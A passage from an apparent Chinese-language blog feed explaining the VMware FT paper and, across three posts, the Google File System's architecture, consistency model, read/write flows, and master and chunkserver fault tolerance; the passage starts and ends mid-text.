为空时，它需要被暂停执行，与之类似的，当 primary 的 Buffer 为满时，它也需要被暂停执行。在这个过程中，backup 的暂停不会对上面的服务产生影响，因为用户仅与 primary 打交道，他甚至意识不到 backup 的存在，但 primary 的暂停却实打实地会影响到用户的体验。为了避免 primary 比 backup 快出太多，系统会检测它们之间的距离，并在超过一定值时降低 primary 的执行速度，等 backup 追赶上 primary 时再将速度恢复。</p><p>说了这么多，那么 Log Entry 到底包含什么内容呢？论文对此并没有给出说明，但 VM FT 是基于复制状态机模型的，所以它不会传递诸如寄存器的值、内存状态等，这些状态的同步通过让两台虚拟机接受相同的确定性输入与事件来达成。 如 2.1 小节所言，输入主要指网络包、读盘、键盘鼠标输入等，事件则主要指中断。其实由于默认配置下 backup 并不会真的读盘，所以它会“读到什么内容”也是通过 Log Entry 来同步的，即如果 primary 读盘获取到了内容 ABCD，那么这个内容会被写入 Log Entry，backup 的 Hypervisor 会通过模拟来让 backup 以为自己读盘并获取到了 ABCD 的内容。与之类似的，由于 backup 也不会收到其他的外设发送的内容，所以这些信息也是通过 Log Entry 来显式传递并被模拟的。</p><p>对于中断，要求要更严格一些。首先，操作系统本身其实就是一个被各种中断所驱动的大循环体，所以要想保证两个操作系统的状态一致，那么“在什么指令处发生了什么中断”必须是严格一致的。怎么保证这一点呢，我推测每个 Log Entry 都记录了它被发送时 primary 执行到了什么阶段，而 backup 在重放这个 Log Entry 时，最多只能执行到同样的阶段，也就是说，Log Entry 对 backup 而言就像是调试代码时的断点，backup 的执行并不是连续的。即便 primary 不接受任何的外部输入，由于时钟中断的存在，backup 也能以此来同步 primary 的执行。</p><p>此外，虚拟机在读盘时可能会使用 DMA 等异步传输技术。这意味着在虚拟 cpu 收到中断前，有一块内存区域是被协处理器写入的。如果此时我们主动去读取这部分内存，那么由于并发读写的原因获得的结果就会是不确定的。为了避免这样的情况，VM FT 使用 bounce buffer 来处理。具体来说，它使用另一块内存空间用于供协处理器使用 DMA 来读写内容，这块空间对虚拟机而言是不可访问的，在读盘结束时协处理器会触发中断，此时由 Hypervisor 主动将这块内存中的内容拷贝到虚拟机内存中供应用访问，这份内容同样会以 Log Entry 的形式同步给 backup。这其实有点像 MVCC，在整个过程中，虚拟 cpu 与协处理器接触的区域是不一样的，所以它们互不影响。</p><p>从上面的描述中可以发现，primary 几乎以异步的方式使用 Logging Channel 来向 backup 同步状态，在之前讨论 GFS 时我们提到，异步同步的缺点在于不能确定操作什么时候被同步以及是否同步成功。那么这种方式会不会造成什么问题呢？考虑这样一个场景，primary 从硬盘读取一些内容，再在相同的地方写入新的内容。这时由于 primary 和 backup 的执行存在时间差，可能 backup 会在 primary 执行写入之后才进行读取，那么此时 backup 读到的内容是否会与 primary 读到的不一致呢？在我们当前的所有讨论中，都以 VM FT 的默认实现方式为准，这种实现方式中 backup 并不会真的去读盘，它读取到的内容实际是被 primary 显式传输再被自己的 Hypervisor 模拟的。也就是说，primary 读取到内容 123，它会发送“让 backup 在 X 这个执行阶段从硬盘中读到 123”这种语义的 Log Entry，backup 的 Hypervisor 在收到它时，会欺骗 backup，让它以为自己真的读取了硬盘并从中获取了 123 这个内容。因为 backup 并不会读盘，所以即便此时硬盘上的内容被更新为 456，也不会对 backup 在 X 这个执行阶段产生任何导致不一致的影响。</p><p>另一方面，primary 也不是完全异步地在使用 Logging Channel 的，除了在 Buffer 满时要停下来等待，VM FT 还设置了 Output Rule 的限制。这个限制要求 primary 的所有输出都要在收到 backup 的 ACK 时才能被发送，所以如果用户与 primary 交互并获得了它的反馈时，这个反馈前的所有 Log Entry 都被 backup 重放过了。而这其实就足够了，因为在此之后即便 primary 崩溃了，backup 与 primary 的不一致也不会被用户感知到，因为这种不一致是从上一次的输出开始的，而下一次的输出取决的是当时的 primary，谁又能知道它是谁呢？</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
          <category> 论文 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅析 Google File System（三）</title>
      <link href="/2022/07/05/GFS3/"/>
      <url>/2022/07/05/GFS3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前两篇文章主要讨论了 GFS 的架构以及其提供的各种操作的原理，在理想状态下这些组件与功能已经足够上层应用使用了。但是正如论文第 1 节中所描述的，GFS 是工作在上千台普通机器上的分布式系统，所以它应该将“组件会出错”看作是普通事件而不是异常。基于这个理念，GFS 提供了一些机制，以尽可能地减小组件出错对整个系统的影响，本文对此进行讨论。</p><h1 id="Master-的容错"><a href="#Master-的容错" class="headerlink" title="Master 的容错"></a>Master 的容错</h1><p>绝大多数分布式系统都使用 replica 来避免因一个组件或数据发生损坏而影响整个系统，这些 replica 之间通过与 primary（即所有副本中最有发言权的那个）共享一些信息来维持相互之间的一致性，这个共享通常发生在 primary 发生变化时，所以共享的信息就是“发生了什么变化”，具体的形式见下文。传递变化的方式有两种，即同步与异步。</p><p>如果采用同步的方式，那么 primary 的操作就会被拖慢，因为它需要等待所有参与共享的 replica 都收到变化并给出响应后才认为操作完成，但更慢的操作带来的是明确的结果，即 primary 可以得知每个 replica 对这次变化的反应；与之相对的，异步传递变化不会对 primary 的操作有明显的时间影响，但 primary 也很难明确地知道其他 replica 对这次变化的反应。</p><p>正因为这两种共享方式各有利弊，所以 GFS 对 Master 同时应用了它们。具体来说，Master 会将元信息的变化<strong>同步</strong>通知给一些机器，这些机器只负责接受这些信息并保存，在 primary 正常时这些机器上并没有另一个 Master 进程。而一旦 primary 发生故障且不可以通过重启本机 Master 进程来恢复，<strong>监控系统</strong>（这个系统独立于 GFS，也是 Google 内部的一个基础设施）就会在某台此前接收变化的机器上启动一个新的 Master 进程，这个进程在启动后读取之前接收的所有变化，这些变化可以帮助它构建元信息从而变成可以提供服务的状态，此后它将作为 primary 来继续响应客户端的各种请求。</p><p>然而由于每台机器的 IP 都是分配好的，在新的机器上启动 Master 就代表着访问 Master 的 IP 会发生变化，为了避免客户端和 ChunkServer 因此而重启，GFS 中使用 DNS 来访问 Master，而一旦 IP 发生变化，这条 DNS 记录就会被修改，由此也就完成了流量的切换。其实这种使用可控的内部 DNS Server 来向上层屏蔽 IP 变化的理念在很多项目中都有用到（比如 K8S），与之类似的还有 Virtual IP 的概念，非常有趣。</p><p>同步传输可以保证目标机器一定收到了 primary 的变化，而这些变化又可以帮助新的进程达到和曾经的 primary 同样的内部状态，这样的机制已经将 Master 的故障带来的影响降得很低。但是，为了获得一个可用的新的 Master，整个系统要经历原机器上 Master 进程的重启、选择新机器、新机器上启动 Master、新 Master 读取变化恢复状态、修改 DNS 记录、ChunkServer 上报位置信息等一系列操作，这其实是一个非常耗时的过程，而如果整个系统对 Master 仅有这一种容错机制，那就代表着在这么长的恢复时间中，GFS 将处于一个完全不可用的状态（这里不考虑客户端可能有一些缓存信息，使它<strong>暂时不需要</strong>与 Master 交互），这是不可忍受的。</p><p>因此，GFS 提供了一种 Shadow Master 的机制，具体而言，整个集群中除了 primary 外还有一些机器上运行着 Master 进程，primary 在产生变化时将变化信息异步传递给这些机器，运行在这些机器上的 Master 进程就可以 replay 这些变化，从而达到和 primary 同样的状态。如前所述，异步传输会导致一定的延迟，但这种延迟对 GFS 而言是可以接受的，一方面和变化的内容有关，这个在后文会给出解释；另一方面，这些 Shadow Master 是只读的，也就是说它们只能接受来自客户端的读请求，所以异步传输导致的延迟不会让系统变得混乱（因为没有“写”操作），而客户端要想因这个延迟读取错误的内容，首先需要 primary 发生故障，其次 Shadow Master 还没有同步完相关变化，最后读取的部分恰好要在没同步完的区域中，这已经是很小的概率了。</p><p>说了这么多，那么 primary 和其他 replica 究竟同步了什么呢？答案是操作日志，它的原理有点像 InnoDB 存储引擎的 redo 日志，只不过 GFS 的操作日志记录的是元信息的变化。元信息指的就是 Namespace、文件到 chunk handle 的映射以及 chunk 的位置信息，GFS 只记录前两种，最后一种依赖 ChunkServer 的上报。</p><p>GFS 提供的很多操作接口都会让元信息发生变化，而一旦它们发生变化，Master 首先要做的就是将它们的变化写入到操作日志中，然后将它们同步发送给一些备份用机器，再异步发送给运行着 Shadow Master 的机器。无故障地做完这些，Master 才会做实际的动作，并响应客户端的请求。这种“先写日志再做操作”的方式被称为 Write Ahead Log，简称 WAL，是一种被广泛应用在各个知名项目中的技术。</p><p>操作日志的 replay 可以帮助备份的 Master 进入到一个可用的状态，但如果仅靠这个机制还是有一些问题。比如如果持续地对元信息做修改，就会让操作日志越来越大，时间长了这就是一个很大的存储开销。另一方面，如果每次备份 Master 都需要从操作日志的第一条开始 replay，那么当日志非常长时，这个恢复操作就会非常慢。为了解决这个问题，GFS 又实现了 checkpoint 的机制，原理上还是和 InnoDB 类似，其实也是一种被广泛应用于各个项目中的技术。</p><p>具体而言，当操作日志达到一定大小后，GFS 会对 Master 当前的状态做一个 checkpoint，这个 checkpoint 可以快速地让 Master 进入这个确定的状态，论文中的描述是 checkpoint 的组织方式可以快速被映射到 Master 进程的内存空间中。checkpoint 和操作日志一样会被发送到其他机器上供其他 replica 使用。对于一个备份 Master 而言，它在启动时只需要使用最新的 checkpoint 恢复到对应的状态，然后 replay 这个时间点以后的所有操作日志即可，相对于前面提到的从第一条操作日志开始 replay，这种新的方式可以大大减少 Master 的恢复时间。而最新的 checkpoint 之前的所有 checkpoint 与操作日志都可以被删除（当然也可以留着做更好的容错），从而释放出对应的存储空间。</p><h1 id="ChunkServer-的容错"><a href="#ChunkServer-的容错" class="headerlink" title="ChunkServer 的容错"></a>ChunkServer 的容错</h1><p>ChunkServer 的容错表现在当某些 ChunkServer 进程崩溃或其所在的机器损坏时，整个系统依然能够完成对 所有 chunk 的读写操作。在前面的博文中曾提到，这其中最重要的在于 chunk 的 replica。</p><p>replica 之间的一致性由写操作来保证（详见上一篇博文），用户可以对 Namespace 上某个节点的 replica 做配置，也就是可以在文件夹和文件两个等级进行配置，这里的配置主要指数量的配置，而 chunk 的具体位置则由 GFS 来决定。论文 4.2 小节中提到，GFS 会将多个 replica 分布在不同的机架（rack）内的机器上，这样做的好处在于，即便因为一些原因导致某个机架直接不可用，GFS 也可以使用其他机架上的 replica 来提供服务。此外，这种分布方式也可以优化客户端的请求，它可以选择一个离自己最近的机器来完成读写操作。但与之相对的，这种分布也意味着客户端做写操作时，网络流量要垮多个机架，这通常是比较慢的，但正如论文 4.2 小节中所说，这是 Google 作出的一种 trade-off。</p><p>chunk 的位置并不是不变的，它可能因为 ChunkServer 的负载过高而被迁移到其他机器上，这被叫做 Rebalancing。此外，当 ChunkServer 挂掉或 chunk 的某个 replica 不可用（不可用的原因见下文）时，整个集群中可用的 chunk 就与用户的预期不符（比如用户设置了 3 个副本，但因为有 1 个故障，此时可用的副本数为 2），GFS 也会进行 re-replication，这可能会在其他 ChunkServer 上创建副本。反之，如果集群中的副本数量大于用户的配置，GFS 也会对多余的副本进行删除，这也是一种 re-replication。</p><p>这里有一个问题，就是一个 chunk 的所有 replica 是否具有同样的 chunk handle，论文对此并没有给出解释，但我认为在工程上无论是否相同都是可以实现的。而是否相同则会有不同的弊端，如果是相同的，那么用户也许就无法声明大于机器数量的 replica，因为如果机器只有 2 台，而用户声明需要 3 个 replica，那么就一定有一台机器上有两份副本，此时同一台机器上有两个拥有同样 chunk handle 的 chunk，如果不加一个中间层做处理就会有冲突；而如果副本的 chunk handle 是不同的，那么实际可用的 chunk handle 就会变少，因为一个 chunk 的副本就会占用多个 chunk handle。</p><p>那么什么情况下 chunk 的副本会变得不可用呢？在 chunk 过期或者损坏的情况。先说过期，这种现象发生在 secondary chunk 所在的 ChunkServer 短暂的宕机后又重启，而在宕机期间，该 chunk 的其他副本发生了写入操作，此时如果 ChunkServer 恢复，那么这个恢复的 chunk 上的数据就和其他机器上的数据不一致，也就是过期了。为了避免这种情况，GFS 提供了版本号的机制，具体来说，Master 为每个 chunk 维护了一个版本号，在发生写入操作时，这个版本号会增加。所以对于一个 chunk 而言，它的每个副本有一个版本号，Master 也有一个对应于这个 chunk 的版本号，通常情况下它们是相同的，而一旦不同，Master 就以集群中最高的那个为基准（Master 上的版本号可能低于 ChunkServer 上记录的，因为 Master 也会宕机），然后删除掉那些旧的 chunk，再 re-replication 出新的 chunk。此外，由于更新操作会有一些延迟，Master 在发送 chunk 的位置信息时也会发送各个副本对应的版本号，这样客户端就可以主动选择最大的那个，避免读取过期的数据。</p><p>另一方面，chunk 也可能损坏，这主要表现在磁盘可能会出问题导致保存的数据发生变化，或文件系统在写入数据时也可能发生问题等，总之最终的结果就是 chunk 中保存的数据和用户想要写入的不一致，这也可以被看作是一种 undefind。为了尽可能避免这个问题，GFS 提供了 checksum 的机制，具体而言，一个 64MB 的 chunk 会被分成多个 64KB 的块，每个块有一个对应的 32 位的 checksum。在读取一个 chunk 时，ChunkServer 会对读取的内容重新计算 checksum 并与保存的 checksum 做对比，一旦不一致就会回复一个错误给客户端，此时客户端需要从其他 ChunkServer 上读取这个 chunk，而这个异常也会被通知到 Master，使得它可以对这个 chunk 进行 re-replication。</p><p>毫无疑问，这种机制会让 chunk 的读写都受到一定的影响，其中写操作的影响更大一些。由于 Google 内部的追加写操作要远多于随机写，所以 GFS 对追加写操作做了一些优化。先来看普通写，它的作用是“在文件 A 的 X 字节偏移处写入 Y 个字节”，那么写入的这些内容会不同程度地影响 chunk。比如如果写入 64 KB 的内容，那么就可能修改了一个完整的<strong>块</strong>（这个<strong>块</strong>是指与一个 32 位的 checksum 对应的块，不是 chunk，下同），也可能修改了两个连续的块，如果写入大于 64 KB 的内容，就可能修改了两个块或三个块，但一定有一个块是被完全覆写的。因此，GFS 的做法是在被修改的所有 chunk 中选择最开始和最后的两个，读取并验证它们的 checksum，如果是正确的才执行写入，否则要先对这两个 chunk 进行 re-replication，然后才能执行写入。之所以要验证首位的两个块，是因为写入操作会重写内部的 checksum，这样即便那些没有被覆写的区域中有数据损坏的问题也不能被发现了。</p><p>对于追加写来说，GFS 可以<strong>增量地更新</strong>当前最后一个块的 checksum，怎么理解这个增量更新呢，比如编程语言中的 md5 计算，会有类似 <code>md5(&quot;1111&quot;).update(&quot;2222&quot;) == md5(&quot;11112222&quot;)</code> 的规则，增量更新指的应该就是这一点。对于当前文件中的最后一个块而言，它只在没有写满 64KB 的情况下才会被追加内容，否则内容会被追加到下一个块中。而在追加操作前，块的 checksum 计算的是 64KB 中已经写入的部分，在追加操作时只需要 update 新写入的部分即可。这时并不需要读取并验证原来的 checksum 是否正确，因为如果写入原来的内容时预期的内容是 1111，而实际写入的是 1112，上面的等式的左边就是 <code>md5(&quot;1111&quot;).update(&quot;2222&quot;)</code>，右边就是 <code>md5(&quot;11122222&quot;)</code>，它们是不相等的。这样在下次对这个块进行读取时就可以发现问题并作出反应了。</p><p>除了通过主动读取来验证 checksum，当 ChunkServer 处于一个低负载状态时，它也会扫描自己保存的所有 chunk 上的各个块，判断是否出现 checksum 验证不通过的现象，并将这些信息上报给 Master，Master 也会根据这些信息进行 re-replication，从而保证集群中的数据完整。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>到此为止，我想讨论的 GFS 相关的内容就结束了。为了更好地理解 GFS 的内部机制，我找到了一个 GFS 的简单实现，用 golang 语言开发，在此也把<a href="https://github.com/merrymercy/goGFS" target="_blank" rel="noopener">它</a>分享给各位。</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
          <category> 论文 </category>
          
          <category> 存储 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅析 Google File System（二）</title>
      <link href="/2022/07/05/GFS2/"/>
      <url>/2022/07/05/GFS2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>论文<a href="https://pdos.csail.mit.edu/6.824/papers/gfs.pdf" target="_blank" rel="noopener">下载</a></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="/2022/07/03/GFS1">上一篇</a>博客中讨论了 GFS 的部分操作接口，主要聚焦在 Master 和 Client 上。但是对于一个文件系统而言，文件的存储才是其核心的能力，本文将讨论 GFS 的读写接口，包括读写文件的流程以及一致性模型。虽然 GFS 作为一个分布式的文件系统，仅实现了一个非常宽松的一致性模型，但却足以支撑 Google 内部的一些业务。此外，GFS 的一些错误处理在下一篇文章中继续讨论。</p><h1 id="GFS-的一致性模型"><a href="#GFS-的一致性模型" class="headerlink" title="GFS 的一致性模型"></a>GFS 的一致性模型</h1><p>在讨论读写操作前，首先要先介绍一下 GFS 的一致性模型。这里的一致性指 ChunkServer 上的一致性，关于 Master 的一致性在后面的内容中会涉及。</p><p>GFS 定义了两个词，一致的（consistent）和确定的（defined）。具体来说，同一个 chunk 可能会被保存多份，那么如果这些副本中的内容相同，就说这是<strong>一致的</strong>；而如果用户向 chunk 中写入了内容，然后读取时发现内容和写入的一样，就说这是<strong>确定的</strong>。</p><p><strong>一致的</strong>比较好理解，但为什么会有<strong>不确定的</strong>现象呢。这主要在于 GFS 在同一时间可能被多个用户访问，如果用户 A 向 chunk1 中写入内容，那么在他执行读取操作前， chunk1 中的内容是有可能被用户 B 修改的，所以用户 A 读取出来的内容就和写入不一样，也就是不确定。另外，如果用户 A 和用户 B 同时向两个 chunk 中写入内容，也就是 128MB 大小的数据，也可能会出现第一个 chunk 是用户 A 写入的内容，第二个 chunk 是用户 B 写入的内容的情况，或者反过来，这也是不确定的。</p><p>对于 write 和 record append 两个操作，GFS 提供了不同的一致性保证，具体如下表所示：</p><table><thead><tr><th></th><th>write</th><th>record append</th></tr></thead><tbody><tr><td>顺序访问</td><td>defined 且 consistent</td><td>defined 但是有一些 inconsistent 的内容</td></tr><tr><td>并发访问</td><td>undefined 且 consistent</td><td>defined 但是有一些 inconsistent 的内容</td></tr><tr><td>写入失败</td><td>inconsistent</td><td>inconsistent</td></tr></tbody></table><p>光看这张表的话不是很容易理解，下面我们分别针对不同的操作来具体讨论。</p><h1 id="write-操作"><a href="#write-操作" class="headerlink" title="write 操作"></a>write 操作</h1><p>对于一个 chunk 而言，它可能会有多个 replica，分布式系统应该保证 replica 的内容是一致的，这被 GFS 称之为 consistent。从表中 write 的部分可以看到，只要写入成功，那么 GFS 的状态一定是 consistent 的，通常而言，这种一致性需要一个协调者来实现。</p><p>GFS 把这个协调者的任务交给 replica 的其中一个，具体交给谁呢，这取决于 GFS 把租约（lease）下发给谁，拿到租约的 replica 被称为 primary，而其余的 replica 被称为 secondary。按照我的理解，租约可以看作是带时间限制的锁，GFS 把这个时间限制设为 60 秒，这意味着如果一个 replica 拿到了租约，那么通常它在其后的 60 秒内会作为 primary，然后负责协调并发写入时的顺序。为什么说通常是 60 秒呢，因为租约既可以被续租，也可以被提前回收。比如前面提到的 snapshot 操作，就需要回收被复制的目录及其内部所有文件的租约，避免在创建快照的途中发生写入操作造成混乱。</p><p>论文 3.1 小节详细描述了 GFS 读写文件的流程，但是我觉得有一些遗漏。文中以客户端询问 Master 某个 chunk 及其 replica 的位置作为流程的第一步，我认为作为一个文件系统，客户端应该处理的是“在文件 A 的第 X 字节偏移处写入 Y 个字节”这样的语义。所以整个流程的第一步应该是客户端根据 X 的值算出 chunk 的下标和写入位置在 chunk 上的偏移量，由于 chunk 固定为 64 MB，所以这很容易。这样以后，客户端需要的信息就是“文件 A 的第 Z 个 chunk 在哪里”，而这正是 Master 可以提供的服务。</p><p>Master 在返回客户端结果时需要告诉它哪个 replica 是 primary，所以如果此时还没有 primary，那么 Master 会先下发一个租约给某个 chunk，然后再把信息返回给客户端。客户端拿到这些信息后会将它们缓存在本地，下次查询相同的信息时就可以避免再与 Master 交互。3.1 小节中提到客户端仅在 primary 不可访问或它不再拥有租约时才会再次向 Master 获取这些信息，但是 2.4 小节中提到客户端缓存的信息会过期，或 reopen 文件时被清空，所以在这些情况下，客户端同样需要访问 Master 来获取 chunk 的位置信息。</p><p>确定了 primary 和其他 replica 的位置后，客户端就可以向它们所在的 ChunkServer 推送数据了。GFS 采用了一种<strong>流水线式</strong>的传输，即客户端会将数据传输给离它最近的 ChunkServer，而这个 ChunkServer 在接收数据的同时又会将数据发送给另一个 ChunkServer，以此类推，最终达到的效果就是客户端仅需要与一个 ChunkServer 交互，就可以将数据推送给所有与本次传输相关的 ChunkServer。从这里也可以得知，ChunkServer 是有能力知道它上面的某个 chunk 的其他 replica 在哪个 ChunkServer 上的，这可能是客户端在发送数据前告知它的，也可能是它查询了 Master，不论是哪种方式，都需要保证数据传输时不会出现环路，即 A 发给 B，B 发给 C，C 发给 A 的情况。</p><p>ChunkServer 收到来自客户端或其他 ChunkServer 的数据后，会将它们先放在一个内部的 LRU 缓存里，论文中没有解释为什么要用 LRU，根据这种缓存的性质来推测，可能是想尽可能保证热点数据被写入。因为只有缓存中的数据才有机会被写入到 chunk 中，而机器的内存是有限的，所以要尽可能把那些热点的数据放在缓存里，这样即便内存不足，被逐出缓存的也只是那些相对较冷的数据。</p><p>当所有相关的 ChunkServer 都收到了数据后，客户端会发送一个写请求给 primary，这个请求中标识了刚刚传输的数据，也就是可以从前文提到的 LRU 缓存中找出对应的内容。primary 会决定一个执行写入的顺序，然后按这个顺序将 LRU 缓存中的内容写入到对应的 chunk 中，成功后会将这个请求转发给其他的 replica，让它们也将缓存中的内容持久化到 chunk 里。primary 给写入请求做了编号，来保证其他 replica 的写入顺序和自己是一致的，而只要写入顺序是相同的，那么一旦写入成功，最终 chunk 的状态就是一致的，也就是所谓的 consistent。当 primary 收到所有其他 replica 写入成功的消息，它就会回复客户端写入成功。</p><p>这是比较理想的情况，现实里也会存在写入失败的情况，比如可能 LRU 缓存中的内容已经被逐出，那么客户端发送写请求到 primary 时，它就不能根据里面的标识在缓存中找到对应的数据。此外，写入 chunk 时也可能会遇到问题。如果上述操作中的任意环节出现问题，客户端都会认为写入失败。这时 chunk 的内容是不确定的，大概率是不一致的，也就是表中的 inconsistent，GFS 对于这种情况的处理相当简单粗暴，就是重试。</p><h1 id="record-append-操作"><a href="#record-append-操作" class="headerlink" title="record append 操作"></a>record append 操作</h1><p>record append 操作和 write 操作的流程大体类似，论文 3.3 小节中对此作出了一些描述。在机制上，record append 操作和 write 操作的主要区别在于，追加时的文件偏移是由 GFS 决定的，而 write 操作的偏移是由用户决定的。除此之外，追加写入的内容最大只能是 16 MB，原因见下文。</p><p>根据 3.3 中的内容，可以推测客户端会询问 Master 类似“文件 A 的最后一个 chunk 在哪”这样的问题，然后 Master 做和上文所述的同样的操作（也就是下发租约，返回结果）。然后客户端将数据以流水线的形式推送到各个相关的 ChunkServer 上，然后对 primary 发送写请求。这时，如果 primary 发现当前的 chunk 中剩余的空间不足以写入追加的内容，那么会将剩余的空间填充（pad），然后让其余的 replica 也做同样的操作，结束后返回客户端失败，并让它在下一个 chunk 上重试。反之，如果当前 chunk 中剩余的空间可以容纳追加的内容，那么就执行正常的写入流程并保证一致性（即在<strong>同样的偏移处</strong>写入同样的内容，如果因为上一个 record append 操作失败导致 primary 上 chunk 最后的位置是 X，其他 replica 最后的位置是 Y，那么写入时以 X 为准），再返回客户端文件内容在 chunk 上的偏移。由于追加内容最大是 16 MB，所以用于填充剩余空间的部分不会超过 16 MB，也就是说每个 chunk 最多浪费 16 MB 的空间。</p><p>这个流程中可能让人疑惑的点在于为什么客户端要先将数据推送到 ChunkServer 上，再由 ChunkServer 决定是否可以执行写入呢？如果 ChunkServer 决定不能写入，那么刚刚推送的数据就没有任何意义。为什么不先询问 ChunkServer 是否有足够的空间，再决定是否推送数据呢？原因在于，即便先查询的结果是有足够的空间，在传输数据后执行写入时也可能没有足够的空间，因为这中间隔了非常久的时间，而追加操作又是多个客户端并发的，所以在这个时间间隔内可能其他的客户端已经完成了追加操作占满了 chunk 的空间。</p><p>那是否可以让 ChunkServer 为某个客户端预留一块空间，或者让 Master 参与协调将多个客户端的追加操作调度一下呢？这也不行，一方面会增加系统的复杂度，另一方面，即便 GFS 为某个客户端预留了一块空间，客户端也完全可以选择不向里面写入数据，而这块空间又不能被其他客户端使用，这样 chunk 的空间就浪费了。</p><p>从上面的描述中可以发现，GFS 处理 record append 的写入错误也同样使用重试，只不过由于 record append 是在文件的最后一个 chunk 的末尾写入数据，所以第二次重试时写入的位置和第一次已经不一样了。那么多次重试直到某次写入成功，此时整个文件中至少有一个 chunk handle 对应的 chunk，它的某个位置上拥有完整的追加内容，且其他 replica 在这个位置上也有同样的完整的内容。而与之相对，此前的失败追加也会在 chunk 中留下各种不一致的内容，但 GFS 本身保证的就是<strong>至少一次</strong>的原子追加，所以这些不一致是可以容忍的。</p><p>总结来看，record append 中成功的操作会在 chunk 的某个位置上留下完整的内容，且这个内容不会因为其他客户端的并发 record append 操作而被覆盖掉，也就是所谓的确定的（defined），但失败的操作也会在 chunk 中留下一些不一致的内容，也就是所谓的 inconsistent。这就是前文的表中所描述的内容了。</p><h1 id="read-操作"><a href="#read-操作" class="headerlink" title="read 操作"></a>read 操作</h1><p>相较于写入，read 操作就显得非常简单了。首先，客户端想知道“文件 A 的 X～Y 字节偏移处的内容”，那么由于一个 chunk 的大小是固定的 64 MB，客户端就可以根据这个需求计算出 chunk 的下标，然后用文件名和下标来向 Master 查询位置信息。为了减少 IO 的消耗，客户端向 Master 发送的一次请求中可以询问多个 chunk 的信息。</p><p>客户端拿到这个信息后，同样会将它缓存在本地，缓存的过期条件和之前的描述是一样的。客户端寻找一个离它最近的 ChunkServer，然后从那里读取 chunk 中的内容。从上面对 write 操作和 record append 操作的描述中可以得知，chunk 中是存在不一致的内容的，不过这对 Google 而言不是什么问题，因为他们随机读的需求也比较少，像之前讨论的 MapReduce 就是读取了完整的文件，而由于 GFS 的“至少一次”的一致性保证，MapReduce 最终也一定会读取到它需要的内容。</p><p>但是在读取时，整个流程也需要配合 GFS 的错误处理机制，比如前面讨论 record append 时，可以得知文件中会有一些被 GFS 填充的空内容，那么读取时就应该跳过这些内容（可能是按需跳过）。除此之外，由于写入时有可能发生错误（比如比特反转），GFS 在读取时在一定程度上也可以识别到这种错误并作出合理的反应，具体要怎么做就放在下一篇博客中吧。</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
          <category> 论文 </category>
          
          <category> 存储 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅析 Google File System（一）</title>
      <link href="/2022/07/03/GFS1/"/>
      <url>/2022/07/03/GFS1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>论文<a href="https://pdos.csail.mit.edu/6.824/papers/gfs.pdf" target="_blank" rel="noopener">下载</a></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续拜读三驾马车，最近阅读了 GFS 的论文。这篇于 2003 年被收录在 SOSP 上的论文描述了一个工作在上千台机器的集群上的文件系统，其设计影响了后续很多项目，比如 HDFS 就是它的一种开源实现。我没有参与那个年代的技术变革，但是看了很多对这篇论文的评价，大家的观点基本是一样的，即，GFS 在技术上并没有什么创新点，它只是非常好地做了 trade-off，并以一种非常简单的设计做出了适合 Google 内部需求的强大系统。</p><p>于是这篇文章就用来记录一些我的读后总结，欢迎一起交流:-)</p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>GFS 的使用者是 Google 内部的一些应用（比如之前的 MapReduce），所以其设计就需要满足内部的需求。论文的第 1 节和第 2.1 节中都有一些需求上的描述，具体来说包括以下几点：1）GFS 应该工作在由很多常规设备组建的集群上，这意味着需要把“设备会出错”作为一种必然事件来对待；2）操作的文件都是大文件，通常有几个 GB 大小，所以 GFS 在大文件的处理上要优于小文件；3）在写入文件时，追加操作是非常频繁的，几乎没有随机写操作，所以 GFS 对追加写操作做了一些优化，并且也相对更强调它的一致性。</p><p>在设计上，GFS 中包括三个组件，分别是 Master、ChunkServer 和 Client，其中 Master 和 ChunkServer 都是用户态的程序，而 Client 以库的形式被业务代码使用。</p><p>下面简单介绍下这三个组件，更详细的内容见后文。</p><p>Client 负责根据业务代码的需求发送请求与 Master 和 ChunkServer 交互，从而完成各项操作，为了优化性能，它还会缓存一些信息在本地；</p><p>ChunkServer 负责实际的文件存储，它管理的基本单元就是 Chunk，一个完整的文件会被拆分成多个 Chunk，并被存储在 ChunkServer 上。为了更好地容错，每个 Chunk 都会保存多份，这些 replica 被分布在不同的 ChunkServer 上，其数量可以由用户指定。Chunk 在被创建时会被分配一个全局唯一的 Chunk handle 作为标识，这个标识有 64bit 大小，客户端可以使用它向某个 ChunkServer 索要数据。在表现上，每个 Chunk 都是一个按需动态扩展大小的文件（最大 64MB），也就是说 GFS 直接使用了 Linux 的文件系统来提供存储能力，而由于 Linux 在读取文件时自带缓存，所以 GFS 并没有实现自己的缓存；</p><p>Client 在读取文件时是只知道文件名的，那它如何知道文件对应的 Chunk 是哪些，而这些 Chunk 又在哪台  ChunkServer 上呢？这就要通过 Master 了，具体而言，Master 中保存了所有文件到 Chunk 的映射，以及 Chunk 的具体位置，Client 在读写文件时首先通过 Master 来获知对应的 Chunk 和其位置，然后就直接与对应的 ChunkServer 进行交互了，Master 在这里只是起到类似索引的作用。而除了这个功能，Master 还负责锁管理、垃圾回收、过期 Chunk 检测等功能。</p><h1 id="操作接口"><a href="#操作接口" class="headerlink" title="操作接口"></a>操作接口</h1><p>论文 2.2 小节中提到，GFS 并没有实现类似 POSIX 标准的文件系统接口，它支持的操作有 create、delete、open、close、read、write、snapshot、record append。除了这些操作外，根据后文的描述以及之前对 MapReduce 的解读，还可以推知 GFS 也支持 rename 